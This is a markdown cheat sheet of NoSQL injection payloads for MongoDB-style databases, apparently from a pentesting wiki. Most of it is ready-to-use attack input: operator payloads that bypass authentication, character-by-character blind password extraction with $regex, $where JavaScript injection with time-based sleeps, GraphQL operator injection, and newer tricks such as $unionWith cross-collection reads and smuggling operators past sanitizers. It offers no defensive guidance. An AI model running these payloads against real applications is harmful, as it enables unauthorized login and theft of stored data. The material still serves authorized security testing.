---
title: "Payloads: NoSQL Injection"
type: payloads
tags: [payloads, nosql, mongodb, injection, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-11-11
---

# Payloads: NoSQL Injection

Operator and JS injection for MongoDB-style stores. See [[nosql-injection]].

## Auth bypass (operator injection)
JSON body:
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
{"username": {"$in": ["admin","root"]}, "password": {"$ne": 1}}
```

## URL-encoded / form param form
```
username[$ne]=null&password[$ne]=null
username=admin&password[$regex]=.*
username[$gt]=&password[$gt]=
```

## Blind data extraction (regex, char-by-char)
```json
{"username":"admin","password":{"$regex":"^a.*"}}     # true/false -> map each char
{"username":"admin","password":{"$regex":"^ab.*"}}
```
Length: `{"$regex":"^.{8}$"}`. Automate with a script toggling the regex prefix on response diff.

## $where / JS injection (server-side eval)
```
admin'; return true; var x='
'||'1'=='1
'; return this.password.match(/.*/)//
{"$where": "this.password.length > 20"}
{"$where": "sleep(5000)"}                  # time-based blind
```

## Operator cheatsheet
```
$ne $eq $gt $gte $lt $lte   $in $nin   $regex $where $exists $or $and $not
```

## GraphQL / JSON API note
When a GraphQL or JSON API backs MongoDB, inject operators inside variables:
```json
{ "filter": { "role": { "$ne": "user" } } }
```
Pairs with [[wiki/payloads/graphql]] payloads when the resolver passes the object straight to the query.

## NEW 2025-2026

1. **Aggregation pipeline injection**: user input reaching `$expr`/`$match` structure,
   not just values. `$unionWith` (4.4+) is the union-select analog - inject the stage to
   read cross-collection; `$lookup`/`$graphLookup` for relational pivots.
```json
{"$unionWith": {"coll": "users", "pipeline": [{"$match": {"role": "admin"}}]}}
```
2. **Nested operator smuggling past sanitizers**: `$`-key scrubbers that walk only
   top-level objects miss operators nested inside arrays (`[{"$ne": ""}]`) or stringified
   JSON re-parsed server-side.
3. **`$function` / server-side JS**: Atlas App Services `$function` or legacy
   `$where` with string concat = JS injection; `$where: "this.a=='x'||sleep(...)"`.
4. **Redis-stack Lua**: when the store is Redis with JSON/search modules, EVAL argument
   injection (`redis.call` via crafted key/arg) is the RCE analog.
5. **Blind extraction still defaults to `$regex` + `$options`** with per-char binary
   narrowing; pair with `$expr` comparisons when filters block `$regex` keys.
